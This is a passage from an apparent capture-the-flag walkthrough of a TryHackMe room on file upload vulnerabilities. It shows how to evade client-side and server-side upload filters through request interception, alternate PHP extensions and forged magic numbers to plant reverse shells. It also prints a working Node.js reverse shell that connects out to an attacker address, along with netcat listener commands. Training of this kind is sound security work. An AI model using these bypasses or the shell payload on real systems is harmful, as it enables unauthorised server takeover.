<h4 id="file-type-filtering">File-Type Filtering</h4>
<p>FTF is a bit more intensive than simple extension validation, and can be accomplished with the following two approaches, among others.</p>
<h5 id="mime-validation">MIME Validation</h5>
<p><a href="https://en.wikipedia.org/wiki/MIME">Multipurpose Internet Mail Extension</a> &ldquo;is an Internet standard that extends the format of email messages to support text in character sets other than ASCII, as well as attachments of audio, video, images, and application programs.&rdquo;</p>
<p>Notably, for our purposes:</p>
<blockquote>
<p>Although the MIME formalism was designed mainly for SMTP, its content types are also important in other communication protocols. In the HyperText Transfer Protocol (HTTP) for the World Wide Web, servers insert a MIME header field at the beginning of any Web transmission. Clients use the content type or media type header</p>
</blockquote>
<p>The room text explains that:</p>
<blockquote>
<p>The MIME type for a file upload is attached in the header of the request. MIME types follow the format <type>/<subtype>. In the request above, you can see that the image &ldquo;spaniel.jpg&rdquo; was uploaded to the server. As a legitimate JPEG image, the MIME type for this upload was &ldquo;image/jpeg&rdquo;. The MIME type for a file can be checked client-side and/or server-side; however, as MIME is based on the extension of the file, this is extremely easy to bypass.</p>
</blockquote>
<p>and gives us this example:</p>
<p><img src="/images/uv/mime-example.png" alt="mime-example"></p>
<h5 id="magic-number-validation">Magic Number Validation</h5>
<p>While not being impossible to forge, magic numbers are a more accurate way to determine the contents of a file than MIME Validation.  A file&rsquo;s &ldquo;magic number&rdquo; appears as a string of bytes at the beginning of a file. The course gives us an example:</p>
<p>A <code>PNG</code> file would have a first line of <code>89 50 4E 47 0D 0A 1A 0A</code>.</p>
<p><img src="/images/uv/magic-number-example.png" alt="magic-number-example"></p>
<h4 id="file-length-filtering">File Length Filtering</h4>
<p>Filters can be configured to limit the size of files uploaded. This avoid vulnerabilities related to large, complex exploits, as well as preserving system resources that would otherwise be devoted to handling exceptionally large files.</p>
<p>In most cases, this will not affect the ability of attackers to upload a webshell/remote shell-sized file, however exceptionally restrictive filters may require a change in approach.</p>
<h4 id="file-name-filtering">File Name Filtering</h4>
<p>Filters related to uploaded file names not only protect against overwritten files, like the rudimentary attack highlighted in Task 4 - Overwriting Existing Files, but also facilitate the sanitization of file names, which, in turn, mitigates the use of &ldquo;bad&rdquo; characters (e.g., null bytes, &ldquo;control&rdquo; characters like <code>;</code> , and/or the use of UNICODE).</p>
<p>The room notes that:</p>
<blockquote>
<p>&hellip;on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading, so be aware that you may have to go hunting for your shell in the event that you manage to bypass the content filtering.</p>
</blockquote>
<h4 id="file-content-filtering">File Content Filtering</h4>
<p>Some servers may have more complex scanning and verification systems. These are outside of the scope of this room.</p>
<h4 id="before-moving-on">Before moving on</h4>
<p>The room notes that:</p>
<blockquote>
<p>&hellip;none of these filters are perfect by themselves &ndash; they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both&hellip;</p>
</blockquote>
<blockquote>
<p>Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until PHP major version five, it was possible to bypass an extension filter by appending a null byte, followed by a valid extension, to the malicious .php file. More recently it was also possible to inject PHP code into the exif data of an otherwise valid image file, then force the server to execute it.</p>
</blockquote>
<h4 id="question-61">Question 6.1</h4>
<h5 id="what-is-the-traditionally-predominant-server-side-scripting-language">What is the traditionally predominant server-side scripting language?</h5>
<p><strong>Answer:</strong> Earlier in the text, we&rsquo;re told that this is <code>php</code>.</p>
<h4 id="question-62">Question 6.2</h4>
<h5 id="when-validating-by-file-extension-what-would-you-call-a-list-of-accepted-extensions-whereby-the-server-rejects-any-extension-not-in-the-list">When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?</h5>
<p><strong>Answer:</strong> Also in the preceding text, we&rsquo;re told that this is is called a <code>whitelist</code>.</p>
<h4 id="question-63">Question 6.3</h4>
<h5 id="what-mime-type-would-you-expect-to-see-when-uploading-a-csv-file">What MIME type would you expect to see when uploading a CSV file?</h5>
<p><strong>Answer:</strong> Search engine results reveal that this is <code>text/csv</code>.</p>
<h2 id="task-7---bypassing-client-side-filtering">Task 7 - Bypassing Client-side Filtering</h2>
<p>We now delve into more depth related to Client-side vs Server-side binary that we encountered earlier, beginning with the client-side.</p>
<p><strong>Note:</strong> Client-side filtering is generally weaker than server-side filtering</p>
<h3 id="evading-client-side-filters">Evading client-side filters</h3>
<p>There are four primary ways to evade client-side filters:</p>
<ol>
<li><strong>DisablingJavaScript in the browser</strong>
<ul>
<li>This is viable and effective, as long as the web page&rsquo;s basic functionality is not contingent on JavaScript.</li>
</ul>
</li>
<li><strong>Intercepting and modifying incoming pages</strong>
<ul>
<li>Applications like BurpSuite can be used to capture incoming page data, allowing us to remove the JavaScript content before it can run.
<ul>
<li>This method takes place <em>before</em> a webpage is loaded in the browser.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Intercepting and modifying file uploads</strong>
<ul>
<li>This technique allows us to capture and alter uploaded data after it has been accepted by the server&rsquo;s filtering system.
<ul>
<li>This method takes place <em>after</em> a webpage is loaded in the browser.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Sending file(s) directly to the upload point</strong>
<ul>
<li>Using tools like <code>curl</code>, we can upload code directly to upload destinations.</li>
<li>An application such as BurpSuite can be used to capture upload process, in order to analyze and duplicate the necessary parameters.</li>
</ul>
</li>
</ol>
<p>We will now take a look at an approach to executing items 2 and 3 on this list.</p>
<h3 id="methodology-intercepting-and-modifying-incoming-pages">Methodology: Intercepting and modifying incoming pages</h3>
<p>Arriving at <code>http://demo.uploadvulns.thm</code> - a basic file upload page, we inspect the HTML source and find a JavaScript function that checks uploaded files to verify that they are of the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME</a> type <code>image/jpeg</code>. This means that <code>image/jpeg</code> files are <em>whitelisted</em>.</p>
<p>After verifying that the server&rsquo;s upload function works in this manner, we intercept an upload attempt, using BurpSuite.</p>
<p>With <code>interception</code> enabled, we find our header request and right-click, selecting <code>Do Intercept</code> then <code>Response to this request</code>.  When we click <code>forward</code>, we will receive the server&rsquo;s response, allowing us to modify the data by disabling or removing the JavaScript filter function. When we have nullified the filter, we can press <code>forward</code> again to pass the data into our browser. The resulting web page should allow us to upload any type of file.</p>
<p><strong>(Useful) Note:</strong> Burpsuite will not, by default, intercept any external JavaScript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you&rsquo;ll need to go to the &ldquo;Options&rdquo; tab at the top of the BurpSuite window, then under the &ldquo;Intercept Client Requests&rdquo; section, edit the condition of the first line to remove <code>^js$|</code>.</p>
<p><img src="/images/uv/burp-js-interception-alt.png" alt="burp-js-interception-alt"></p>
<h3 id="methodology-intercepting-and-modifying-file-uploads">Methodology: Intercepting and modifying file uploads</h3>
<p>Next, we will perform a similar attack, instead intercepting the uploaded file <em>after</em> it has passed through the server&rsquo;s filtering function.</p>
<p>We will accomplish this by redeploying the Pentest Monkey remote shell script that we used to complete Task 5. Here, we will simply rename the file from <code>ptm-shell.php</code> to <code>shell.jpeg</code>, allowing it to pass through the server&rsquo;s filter. This is due to the fact that the file&rsquo;s inauthentic MIME type of <code>image/jpeg</code> is confirmed by its <code>.jpg</code> extension.</p>
<p>Before initiating the upload, we need to do two things.</p>
<p>First, we set up a <code>netcat</code> listener on our attack machine, just like in task 5, ensuring that the port value corresponds with the variable in the <code>shell.jpeg</code> script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp &lt;port&gt;
</span></span></code></pre></div><p>Second, we enable <code>interception</code> in BurpSuite.</p>
<p>After initiating the upload, Burp will intercept the <code>POST</code> request. In the request details, we can see that the <code>filename</code> is set to <code>shell.jpeg</code>  and the <code>Content-type</code> value is set to <code>image/jpeg</code>, reflecting the whitelist constraint imposed by the server&rsquo;s JavaScript filter function.</p>
<p>After modifying these two fields to <code>filename=&quot;shell.php&quot;</code> and <code>Content-type: text/x-php</code>, we can forward the request to the server. Once the upload has completed, we can navigate to <code>http://demo.uploadvulns.thm/uploads/shell.php</code>, which will execute our reverse shell script, spawning a shell in our <code>netcat</code> listener.</p>
<h4 id="question-71">Question 7.1</h4>
<h5 id="what-is-the-flag-in-varwww">What is the flag in /var/www/?</h5>
<p>We begin by navigating to <code>java.uploadvulns.thm</code> to find a basic upload form web page.</p>
<p><img src="/images/uv/uv-java.png" alt="uv-java"></p>
<p>By viewing the <code>page source</code>, we see that a JavaScript file <code>http://java.uploadvulns.thm/assets/js/client-side-filter.js</code> runs as the last script in the HTML document&rsquo;s <code>&lt;head&gt;</code> section.</p>
<p><img src="/images/uv/uv-java-head.png" alt="uv-java-head"></p>
<p>Which looks like:</p>
<p><img src="/images/uv/uv-java-filter.png" alt="uv-java-filter"></p>
<p>From this, we understand that the <code>image/png</code> MIME type is effectively whitelisted.</p>
<p>Next, we invoke <code>gobuster</code> in <code>directory</code> mode to enumerate server directories. This gives us a couple of results.</p>
<p><img src="/images/uv/uv-java-gb.png" alt="uv-java-gb"></p>
<p>Applying Occam&rsquo;s Razor, as the whitelisted MIME type is an image, it is likely that uploaded files are stored in the <code>/images</code> directory. We can test this theory by uploading some clip-art in <code>PNG</code> format and navigating to the resulting storage location in our browser.</p>
<p><img src="/images/uv/uv-java-coffee.png" alt="uv-java-coffee"></p>
<p><img src="/images/uv/uv-java-coffee-uploaded.png" alt="uv-java-coffee-uploaded"></p>
<p>With the web page&rsquo;s file upload ability and destination established, we can &ldquo;hide&rdquo; our <code>ptm-shell.php</code> as <code>ptm-shell.png</code> and upload the file.</p>
<p><img src="/images/uv/uv-java-coffee-ptm-png.png" alt="uv-java-shell-rename"></p>
<p>We will then initiate our <code>netcat</code> listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
</span></span></code></pre></div><p>and we enable <code>interception</code> in Burp Suite. Then, we initiate the upload and edit the intercepted <code>POST</code> submission from our browser.</p>
<p><img src="/images/uv/uv-java-burpint.png" alt="uv-java-burpint"></p>
<p>After we have used <code>Forward</code> to send it along to the server, we can navigate to <code>http://java.uploadvulns.thm/images/ptm-shell.php</code> to execute our shell script. Our browser will be greeted with:</p>
<p><img src="/images/uv/uv-java-504.png" alt="uv-java-504"></p>
<p>But our <code>netcat</code> listener will have spawned our reverse shell:</p>
<p><img src="/images/uv/uv-java-rce.png" alt="uv-java-rce"></p>
<p>From here we can navigate to the flag!</p>
<p><img src="/images/uv/uv-java-flag.png" alt="uv-java-flag"></p>
<h2 id="task-8---bypassing-server-side-filtering-file-extensions">Task 8 - Bypassing Server-side Filtering: File Extensions</h2>
<p>The previous task was fairly simple, as local filters can be viewed and analyzed, even if this requires a bit of deobfuscatoin or processing. With Server-side filtering, filters can not be viewed directly, thus requiring more experimentation and testing to determine which payloads are permitted by the server.</p>
<h3 id="methodology-1">Methodology</h3>
<h4 id="evading-server-side-filters">Evading server-side filters</h4>
<p>The first example for this task begins by introducing a website that uses the following PHP script to disallow or blacklist files that have <code>.php</code> or <code>.phtml</code> extensions with the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//Get the extension
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">])[</span><span class="s2">&#34;extension&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//Check the extension against the blacklist -- .php and .phtml
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">switch</span><span class="p">(</span><span class="nv">$extension</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s2">&#34;php&#34;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s2">&#34;phtml&#34;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="k">NULL</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$uploadFail</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$uploadFail</span> <span class="o">=</span> <span class="k">False</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>This script checks the extension of the <code>fileToUpload</code> against the simple blacklist of <code>php</code> and <code>phtml</code>.</p>
<p>As we will need to upload a file with another extension, we must consider alternate approaches. The <a href="https://en.wikipedia.org/wiki/PHP">Wikipedia page for PHP</a>  introduce common extensions to look into, which are complemented by an array of uncommon, but executable, <code>PHP</code> formats, such as:</p>
<ul>
<li>.php3, .php4, .php5, .php7, .phps, .php-s, .pht and .phar</li>
</ul>
<p>The text notes that the server in the example is configured not to recognize most of these as <code>PHP</code> files (though, Apache2 servers are actually configured by default to do so). However, <code>.phar</code> files are found to bypass the filter <strong>and</strong> execute as <code>PHP</code> on the server.</p>
<p>The next example uses the same premise, but this time involving a server with an unknown filtering mechanism. This is known as doing it &ldquo;<em>black-box</em>.&rdquo;<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</p>
<p>We begin by verifying that a standard <code>.jpeg</code> file can be uploaded; and that a <code>shell.php</code> script can not. After experimenting with files to better understand what the server will and will not accept, we reach the conclusion that there are no shell extensions that will pass through the filter and also execute on the server.</p>
<p>We then remember that the filtering mechanism in the previous example used <code>pathinfo()</code> to get the file&rsquo;s extension by parsing the characters after the final <code>.</code> in the filename.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$extension</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">])[</span><span class="s2">&#34;extension&#34;</span><span class="p">];</span>
</span></span></code></pre></div><p>We then bypass the server&rsquo;s filter code by changing our payload&rsquo;s filename from <code>ptm-shell.php</code> to <code>ptm-shell.jpeg.php</code>, as the <code>PHP</code> script parses the file&rsquo;s extension as the characters that follow the final <code>.</code>.</p>
<p>Before offering our task question, the text asks us to consider that these examples are among many possibilities for exploiting upload vulnerabilities.</p>
<blockquote>
<p>As with everything in hacking, we are looking to exploit flaws in code that others have written; this code may very well be uniquely written for the task at hand. This is the really important point to take away from this task: there are a million different ways to implement the same feature when it comes to programming &ndash; your exploitation must be tailored to the filter at hand. The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.</p>
</blockquote>
<p><strong>Note:</strong> The room lets us know, for the first time, that this task has implemented a randomized naming scheme and that directories will not always be indexable.</p>
<h4 id="question-81">Question 8.1</h4>
<h5 id="what-is-the-flag-in-varwww-1">What is the flag in /var/www/?</h5>
<p>As in the examples, we begin by navigating to the target site. When we reach <code>annex.uploadvulns.thm</code> , we are greeted with a pseudo-command line interface, which allows us to upload files.</p>
<p><img src="/images/uv/anx-home.png" alt="anx-home"></p>
<p>First, we will upload a standard file to the server. Successsfully doing so will simultaneously give us a file to look for in the server&rsquo;s upload destination directory and also start informing us of which file formats pass through the filter. I will use the same <code>coffee.png</code> clip art file from the previous task for this purpose.</p>
<p>We then begin our investigation by running a <code>gobuster</code> scan of <code>annex.uploadvulns.thm</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
</span></span></code></pre></div><p>The scan enumerates the following directories:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">1. /privacy <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span> <span class="o">[</span>--&gt; http://annex.uploadvulns.thm/privacy/<span class="o">]</span>
</span></span><span class="line"><span class="cl">2. /assets <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 331<span class="o">]</span> <span class="o">[</span>--&gt; http://annex.uploadvulns.thm/assets/<span class="o">]</span>
</span></span></code></pre></div><p>While the <code>/assets</code> directory does not contain our uploaded image file, <code>/privacy</code> does. We note here that the filename has been modified to include date and time information before the existing name:</p>
<p><img src="/images/uv/anx-assets.png" alt="anx-assets"></p>
<p>From here, we try to upload our reverse shell script directly, but are given this error message, as our payload was filtered by the server.</p>
<p><img src="/images/uv/anx-invalid.png" alt="anx-invalid"></p>
<p>From our guided walkthrough earlier, we learned that there are multiple valid and server-executable <code>PHP</code> file extensions, including <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.php7</code>, <code>.phps</code>, <code>.php-s</code>, <code>.pht</code> and <code>.phar</code>. With this knowledge, we can iterate through file extensions for our handy <code>ptm-shell.php</code> script.</p>
<p><img src="/images/uv/anx-ext.png" alt="anx-ext"></p>
<p>While we receive <code>File type is invalid</code> responses for 8 of the 9 files listed above, <code>ptm-shell.php5</code> makes it through the server&rsquo;s filter and into the <code>/privacy</code> directory.</p>
<p><img src="/images/uv/anx-php5.png" alt="anx-php5"></p>
<p>From here we simply invoke our <code>netcat</code> listener on our attack machine with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
</span></span></code></pre></div><p>and then run the script by visiting the file&rsquo;s location in our browser.</p>
<p><img src="/images/uv/anx-solution.png" alt="anx-solution"></p>
<h2 id="task-9---bypassing-server-side-filtering-magic-numbers">Task 9 - Bypassing Server-Side Filtering: Magic Numbers</h2>
<p>This task builds on the previous one, highlighting the use of &ldquo;magic number checking&rdquo; as an approach to server-side filtering.</p>
<h3 id="methodology-2">Methodology</h3>
<h4 id="evading-server-side-magic-number-based-filters">Evading server-side magic number-based filters</h4>
<p>This task&rsquo;s walkthrough begins again with a webpage housing a file upload form. As is expected, <code>.php</code> files are caught in the server&rsquo;s filter, while <code>.jpeg</code> images are not.</p>
<p>As we know that <code>.jpeg</code> files are permitted by the filter, we should be able to add the &ldquo;magic numbers&rdquo; <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">that correspond to this file type</a> to the top of our <code>.php</code> script. To do so, we first add 4 conventional characters (it does not matter which) to the top of our <code>ptm-shell.php</code> script.</p>
<p>Next, we open the file in <code>hexeditor</code> (or an equivalent application) and change the conventional characters to <code>FF D8 FF DB</code> - the magic numbers for <code>.jpeg</code> format files. To check that this has been done properly, run:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">file ptm-shell.php
</span></span></code></pre></div><p>This should return <code>ptm-shell.php: JPEG image data</code>.</p>
<p>We are then able to upload our <code>.php</code> reverse shell script, now disguised as a <code>.jpeg</code> image, to the server and execute it.</p>
<p>Before being given the challenge associated with this task, we are warned that directory indexing has been disabled on the target server.</p>
<h4 id="question-91">Question 9.1</h4>
<h5 id="what-is-the-flag-in-varwww-2">What is the flag in /var/www/?</h5>
<p>Similar to past tasks, we begin by running a <code>gobuster</code> directory scan, which discovers:</p>
<p><img src="/images/uv/magic-gb.png" alt="magic-gb"></p>
<p>While we are not able to view the contents of these directories, due to thier non-indexable nature, we can remain confident that any uploaded files will be housed in one of these locations.</p>
<p>Next, we will send the server some legitimate files to help us improve our understanding of the scope of allowable, unfiltered files that can be uploaded. When attempting to upload our basic test images, we receive the following message:</p>
<p><img src="/images/uv/magic-gifsonly.png" alt="magic-gifsonly"></p>
<p>Now that we know <code>.gif</code> files pass through the server&rsquo;s filter, we upload a new test image, <code>magic.gif</code> to the server and receive a <code>File successfully uploaded</code> message in place of the error message above.</p>
<p>While navigating to <code>http://magic.uploadvulns.thm/assets/magic.gif</code> does not result in access to our uploaded test image, <code>http://magic.uploadvulns.thm/graphics/magic.gif</code> does. Thus, we conclucde that files uploaded to the server are directed to <code>http://magic.uploadvulns.thm/graphics/</code>.</p>
<p>We will now attempt to disguise our favorite reverse shell script, <code>ptm-shell.php</code> as a <code>.gif</code> image file. Currently, it is recognized as:</p>
<p><img src="/images/uv/magic-ft-php.png" alt="magic-ft-php"></p>
<p>Using our <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Wikipedia reference</a>, we find that <code>.gif</code> files use the &ldquo;magic numbers&rdquo; <code>47 49 46 38 37 61</code>. After adding our dummy characters, we use <code>hexeditor</code> to change the first six hex values to our new set of numbers.</p>
<p><img src="/images/uv/magic-hex.png" alt="magic-hex"></p>
<p>This results in our file being recognized as a <code>.gif</code> :</p>
<p><img src="/images/uv/magic-disguised-php.png" alt="magic-disguised-php"></p>
<p>We are then able to successfully upload <code>ptm-shell.php</code> to the server, activate our <code>netcat</code> listener, and execute the script by navigating to <code>http://magic.uploadvulns.thm/graphics/ptm-shell.php</code>. This spawns our reverse shell and gives us access to the flag.</p>
<p><img src="/images/uv/magic-flag.png" alt="magic-flag"></p>
<h2 id="task-10---example-methodology">Task 10 - Example Methodology</h2>
<p>This task gives a useful broken-down overview of the process of auditing and exploiting file upload vulnerabilities on a given target. I will paraphrase the content below, but certainly encourage reading <a href="https://tryhackme.com/room/uploadvulns">the full version</a> in the THM room.</p>
<h3 id="general-step-by-step-walkthrough">General step-by-step walkthrough</h3>
<ol>
<li>Surface-level analysis of the web page/site/application, as a whole.
<ul>
<li>Tools like <code>Wappalyzer</code> give insight into the languages and frameworks used in engineering the application.</li>
<li>Interception of server responses via <code>BurpSuite</code> can also provide useful information.
<ul>
<li>Specifically, headers such as <code>server</code> or <code>x-powered-by</code> can yield essential server information.</li>
</ul>
</li>
<li>At this point, analyzing the attack surface to identify a viable attack vector (e.g., a file upload page) becomes relevant, if necessary.</li>
</ul>
</li>
<li>Inspect potential vulnerabilities (e.g., the aforementioned file upload page)
<ul>
<li>Client-side filtering scripts are a good first area to focus on, as they are low-hanging fruit in terms of our level of control over them.</li>
</ul>
</li>
<li>Work to successfully upload a standard &ldquo;control&rdquo; file (i.e., one without any malicious inclusions or alterations) to the server
<ul>
<li>This allows us to learn more about the server&rsquo;s filtering logic, by beginning to build a list of acceptable uploads.</li>
<li>Equally, this allows us to determine where on the server uploaded files are stored and if there are any restrictions in accessing files in this destination directory.</li>
<li>After making progress on the above task, we can determine if the server renames uploads in accordance with a pre-determined scheme.
<ul>
<li>Importantly, the text notes that the <code>-x</code> flag in <code>gobuster</code> is helpful in the event that successfully uploaded files are difficult to locate.
<ul>
<li>For example, including <code>-x php,txt,html</code> in a <code>gobuster</code> command will append each of these extensions to the selected wordlist.</li>
<li>This is especially useful in scenarios where the server is renaming uploaded files.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Begin attempting malicious file uploads
<ul>
<li>While we expect that server-side filters will stop us from directly delivering our payload, the information that can be derived from resulting error messages will further inform our approach.</li>
<li>Here are four suggested considerations for beginning to circumvent server-side filters:
<ol>
<li>If files with clearly invalid extensions (e.g., <code>.invalidfileextension</code>) can be successfully uploaded, it is likely that the server is using a blacklist, instead of a whitelist.</li>
<li>Changing the &ldquo;magic numbers&rdquo; of your &ldquo;control&rdquo; file (mentioned in step 3) to those of a likely or demonstrably filtered file extension can reveal if the server is using a filtering system that targets them.</li>
<li>Similar to the above, intercepting upload submissions via <code>BurpSuite</code> and modifying the MIME identification headers can reveal if the server is filtering in this manner.</li>
<li>If there are restrictions on uploaded files&rsquo; size/length, using progressively larger file sizes can allow for deducing the server&rsquo;s limit.</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="task-11---challenge">Task 11 - Challenge</h2>
<h3 id="initial-investigation">Initial investigation</h3>
<p>After downloading the provided wordlist, we navigate to <code>http://jewel.uploadvulns.thm/</code>. Immediately, <code>Wappalyzer</code> shows us several relevant technologies found on the page:</p>
<p><img src="/images/uv/jewel-wap.png" alt="jewel-wap"></p>
<p>From this, we learn that this site is running <a href="https://expressjs.com/">Express</a>, a <code>Node.js</code> web application framework. This means that our <code>ptm-shell.php</code> reverse shell script will almost certainly not work, as the server is configured to run <code>JavaScript</code> code.</p>
<p>Luckily for us, the PayloadsAllTheThings <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs">Reverse Shell Cheat Sheet repository</a> on GitHub includes a reverse shell script for use with <code>Node.js</code>. Here it is:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;net&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="p">[]);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">4242</span><span class="p">,</span> <span class="s2">&#34;10.0.0.1&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application from crashing
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">})();</span>
</span></span></code></pre></div><p>After configuring the port and IP address above to match those of our attack machine, we can save this as <code>njs-shell.js</code> to use a bit later.</p>
<h3 id="identifying-vulnerabilities">Identifying vulnerabilities</h3>
<p>For more information, we can inspect the source code of the page, which includes a <code>.js</code> script called <code>/upload.js</code> that uses the following filtering scheme:</p>
<p><img src="/images/uv/jewel-uploadjs.png" alt="jewel-uploadjs"></p>
<p>Also, note this line in the source code of the home page:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;fileSelect&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;fileToUpload&#34;</span> <span class="na">accept</span><span class="o">=</span><span class="s">&#34;image/jpeg&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>We can deduce, from the above code, that the server:</p>
<ul>
<li>Has a size/length limit in place</li>
<li>Filters files that do not contain <code>ÿØÿ</code> as the first three &ldquo;magic number values&rdquo;
<ul>
<li>This corresponds with the first three <code>ISO</code> values for <code>.jpg</code> files</li>
</ul>
</li>
<li>Filters files that do not have a <code>.jpg</code> or <code>.jpeg</code> file extension</li>
</ul>
<p>However, as this is a filtering mechanism that takes place client-side, we will be able to intercept the contents of the script and remove them via <code>BurpSuite</code>, so this should not be much of a problem for us when uploading our malicious payload.</p>
<h3 id="finding-file-upload-destination">Finding file upload destination</h3>
<p>Now we can work toward determinig where file uploads are stored on the server in order to access them.</p>
<p>Next, we upload a standard image file, <code>jewel.jpg</code> to the server.</p>
<p>The upload form on the home page tells us that we can upload an image and &ldquo;add it to the slides.&rdquo; This means that our uploaded image, <code>jewel.jpg</code>, should be stored in the same location as the rest of the slide images.</p>
<p>By using the in-built Firefox Developer Tools, we can see that the other background slider images are stored in the server&rsquo;s <code>/content</code> directory.</p>
<p><img src="/images/uv/jewel-sliderdir.png" alt="jewel-sliderdir"></p>
<h3 id="more-enumeration">More enumeration</h3>
<p>To get a better picture of the directory structure, we return to <code>gobuster</code>.</p>
<p><img src="/images/uv/jewel-gb-dir.png" alt="jewel-gb-dir"></p>
<p>While it seems as though our standard image upload was successful, unfortunately, navigating to <code>/content/jewel.jpg</code> does not give us direct access to the image (nor does<code>/modules/jewel.jpg</code>, <code>/assets/jewel.jpg</code>, or <code>/admin/jewel.jpg</code>).</p>
